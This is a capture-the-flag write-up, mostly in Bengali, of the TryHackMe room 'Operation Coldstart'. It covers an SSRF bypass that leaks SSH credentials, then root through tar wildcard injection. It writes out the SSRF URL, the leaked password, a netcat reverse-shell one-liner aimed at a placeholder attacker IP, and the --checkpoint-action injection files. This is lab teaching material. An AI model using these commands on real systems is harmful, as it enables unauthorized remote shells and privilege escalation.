# TryHackMe Room: Operation Coldstart - Full Writeup
**Date:** June 03, 2026  
**Author:** durjoy  
**Target IP:** `10.49.141.131`  
**Severity:** Hard / Root Exploitation  

---

## 1. Reconnaissance (তথ্য সংগ্রহ)

প্রথমে আমাদের টার্গেট আইপি অ্যাড্রেসের ওপেন পোর্ট এবং সার্ভিসগুলো আইডেন্টিফাই করার জন্য `nmap` স্ক্যান চালানো হয়।

```bash
mkdir -p /mnt/cyber/Cyber_security/TryHackMe_Solve/Operation_Coldstart
cd /mnt/cyber/Cyber_security/TryHackMe_Solve/Operation_Coldstart
nmap -sV -sC -Pn -p- 10.49.141.131
```

### Nmap Scan Results:
- Port 21 (FTP): vsftpd 3.0.5 (Anonymous Login Allowed)

- Port 22 (SSH): OpenSSH 9.6p1

- Port 80 (HTTP): Gunicorn (Web application titled "URL Preview - Volt Labs")
---

## 2. Enumeration & Information Gathering

### FTP Extraction
#### স্ক্যান রেজাল্ট থেকে দেখা যায় FTP সার্ভারে Anonymous Login সক্রিয় আছে। সেখানে লগইন করে আমরা backup.tar.gz নামের একটি ফাইল পাই এবং তা লোকাল কালিতে ডাউনলোড করি।

```
tar -xvzf backup.tar.gz
```

#### ফাইলটি এক্সট্র্যাক্ট করার পর আমরা একটি ফ্লাস্ক (Flask) অ্যাপ্লিকেশনের সোর্স কোড (app.py) পাই। কোডটি ডিকম্পাইল এবং অ্যানালাইসিস করে একটি বড় সিকিউরিটি লুপহোল পাওয়া যায়:
```
ALLOWED_HOSTS = {"kestrel.thm"}

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return abort(403)
    r = requests.get(target, timeout=3)
    ...

@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return f.read()
```

### Vulnerability Analysis (SSRF):
#### ওয়েবসাইটটিতে একটি ?url= প্যারামিটার আছে যা কেবল kestrel.thm হোস্টনেমটি চেক করে। আমরা যদি এই হোস্টে রিকোয়েস্ট পাঠাই, তবে ইন্টারনাল সার্ভার নিজেই নিজের লুপব্যাক অ্যাড্রেসে (127.0.0.1) রিকোয়েস্টটি ফরোয়ার্ড করবে। এটি একটি ক্লাসিক Server-Side Request Forgery (SSRF) দুর্বলতা।

#### এছাড়াও কোডে দেখা যায় /admin/notes পাথটি শুধুমাত্র লোকালহোস্টের জন্য উন্মুক্ত। সুতরাং, আমরা এই SSRF ব্যবহার করে ইন্টারনাল নোটগুলো রিড করতে পারব।


## 3. Weaponization & Exploitation (Initial Access)
আমরা ব্রাউজারে গিয়ে নিচের ইউআরএল-এর মাধ্যমে পে-লোডটি সাবমিট করি:

```
[http://10.49.141.131/preview?url=http%3A%2F%2Fkestrel.thm%2Fadmin%2Fnotes](http://10.49.141.131/preview?url=http%3A%2F%2Fkestrel.thm%2Fadmin%2Fnotes)
```

#### সার্ভার সাকসেসফুলি তার ইন্টারনাল admin_notes.txt ফাইলটি রিড করে আমাদের সামনে আউটপুট দেয়, যেখানে SSH ক্রেডেনশিয়াল দেওয়া ছিল:
```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

### SSH Login & User Flag
#### প্রাপ্ত ক্রেডেনশিয়াল ব্যবহার করে আমরা SSH-এর মাধ্যমে টার্গেট সার্ভারে লগইন করি এবং প্রথম ফ্ল্যাগটি (user.txt) সংগ্রহ করি:
```
ssh webdev@10.49.141.131
# Password: V0ltLabs#summer
cat user.txt
```

## 4. Privilege Escalation (রুট অ্যাক্সেস লাভ)
### Process Monitoring with pspy64
#### টার্গেট মেশিনটি ইন্টারনেট থেকে সম্পূর্ণ আইসোলেটেড থাকায় আমরা লোকাল কালি মেশিনের /mnt/cyber/Cyber_security/Tools ডিরেক্টরি থেকে scp ব্যবহার করে pspy64 টুলটি রিমোট সার্ভারে আপলোড করি।

### Local Kali Terminal:
```
scp "/mnt/cyber/Cyber_security/Tools/pspy64" webdev@10.49.141.131:~/
```

### Remote SSH Terminal:
```
chmod +x ~/pspy64
./pspy64
```
#### pspy64 রান করার পর ব্যাকগ্রাউন্ডে প্রতি মিনিটে চলা একটি রুট ক্রনজব (Cronjob) আমাদের নজরে আসে:
```
CMD: UID=0 | /bin/bash -c cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
### Exploit Code (Tar Wildcard Injection)
#### এখানে tar কমান্ডে ওয়াইল্ডকার্ড (*) ক্যারেক্টার ব্যবহার করা হয়েছে। লিনাক্সে ফাইলের নাম যদি ড্যাশ (--) দিয়ে শুরু হয়, তবে tar সেটিকে ফাইলের নাম না ভেবে নিজের প্যারামিটার বা ফ্ল্যাগ মনে করে। আমরা এই ট্রিক ব্যবহার করে রুট প্রিভিলেজে কোড এক্সিকিউট করব।

#### ১. প্রথমে লোকাল কালিতে একটি নেটক্যাট লিসেনার অন করি:
```
nc -lvnp 4444
```
#### ২. রিমোট সার্ভারে গিয়ে একটি রিভার্সシェル স্ক্রিপ্ট এবং দুটি ট্রিক ফাইল তৈরি করি:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_KALI_IP> 4444 >/tmp/f" > /opt/backups/shell.sh
chmod +x /opt/backups/shell.sh

# Tar injection files
touch /opt/backups/--checkpoint=1
touch /opt/backups/--checkpoint-action=exec="sh shell.sh"
```

### Post-Exploitation & Root Flag
#### ঠিক এক মিনিট পর যখন ক্রনজবটি পুনরায় রান হয়, তখন tar কমান্ডটি আমাদের তৈরি করা --checkpoint-action ফাইলটিকে তার নিজস্ব কমান্ড নির্দেশিকা ভেবে ব্যাকগ্রাউন্ডে shell.sh স্ক্রিপ্টটি রুট হিসেবে এক্সিকিউট করে দেয়।

#### আমাদের নেটক্যাট লিসেনারে সরাসরি root ইউজার হিসেবে কানেকশন চলে আসে:
```
┌──(durjoy㉿Kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.x.x.x] from (UNKNOWN) [10.49.141.131] 48292
whoami
root

cat /root/flag.txt
# [SUCCESSFULLY CAPTURED THE ROOT FLAG]
```
